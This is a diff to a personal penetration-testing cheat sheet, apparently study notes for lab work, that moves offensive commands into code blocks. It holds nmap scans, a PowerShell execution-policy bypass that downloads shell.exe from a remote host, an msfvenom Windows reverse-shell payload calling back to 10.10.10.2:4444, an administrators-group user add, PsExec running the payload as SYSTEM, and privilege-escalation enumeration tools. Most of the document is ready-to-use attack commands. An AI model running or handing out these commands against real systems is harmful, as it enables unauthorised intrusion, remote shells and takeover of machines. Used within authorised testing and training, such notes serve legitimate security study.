@@ -21,14 +21,20 @@ imma just throw things that work in here
 ## Reconaissance
 
 ### Port Scanning
-full TCP scan
-> sudo nmap -sC -sV -O --open -p- -oA full-tcp [targets]
+####full TCP scan
+```bash
+sudo nmap -sC -sV -O --open -p- -oA full-tcp [targets]
+```
 
-full UDP scan
-> sudo nmap -sU -p- -oA full-udp [targets]
+####full UDP scan
+```bash
+sudo nmap -sU -p- -oA full-udp [targets]
+```
 
-scripts w/ ports
-> sudo nmap --scripts vuln,safe,discovery -p \[ports] [targets]
+####scripts w/ ports
+```bash
+sudo nmap --scripts vuln,safe,discovery -p \[ports] [targets]
+```
 
 ### Directory Enumeration
 
@@ -41,9 +47,9 @@ scripts w/ ports
 
 #### From Cmd.exe
 
-'''bash
+```bash
 powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.2:8080/shell.exe','C:\Users\Public\shell.exe')
-'''
+```
 
 
 ## Privilege Escalation 
@@ -60,51 +66,72 @@ First and foremost, [g0tmi1k's blog](https://blog.g0tmi1k.com/2011/08/basic-linu
 - **The Basics**
 
 **Your User**
-> whoami
-> whoami /priv
-> net user [user]
-
+```bash
+whoami
+whoami /priv
+net user [user]
+```
 **System Config**
-> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
-> ipconfig /all
-> netstat -ano
-> tasklist /SVC
+```bash
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+ipconfig /all
+netstat -ano
+tasklist /SVC
+```
 
 
 - **Payloads**
 
-msfvenom executable payload
+### msfvenom executable payload
 
-> msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.10.2 LPORT=4444 -f exe -o reverse.exe
+```bash
+msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.10.2 LPORT=4444 -f exe -o reverse.exe
+```
 
 RDP- add user to administrators group first
 
-> net localgroup administrators [user] /add
+```bash
+net localgroup administrators [user] /add
+```
 
 PsExec from Windows Sysinternals
 
-> .\PsExec64.exe -accepteula -i -s C:\temp\reverse.exe
+```bash
+.\PsExec64.exe -accepteula -i -s C:\temp\reverse.exe
+```
 
 - **PrivEsc Enumeration Tools**
 
 [PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1):
-> powershell -exec bypass
-> . .\PowerUp.ps1
-> Invoke-Allchecks
+```bash
+powershell -exec bypass
+. .\PowerUp.ps1
+Invoke-Allchecks
+```
 
 [SharpUp](https://github.com/GhostPack/SharpUp):
-> .\SharpUp.exe
+```bash
+.\SharpUp.exe
+```
 
 [SeatBelt](https://github.com/GhostPack/Seatbelt) (more verbose, less targeted at privesc):
-> .\SeatBelt.exe all
-> .\SeatBelt.exe Nonstandard
+```bash
+.\SeatBelt.exe all
+.\SeatBelt.exe Nonstandard
+```
 
 [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS):
 List checks
-> .\winPEASany.exe -h
+```bash
+.\winPEASany.exe -h
+```
 Single check
-> .\winPEASany.exe userinfo
+```bash
+.\winPEASany.exe userinfo
+```
 All checks
-> .\winPEASany.exe
+```bash
+.\winPEASany.exe
+```
 
 
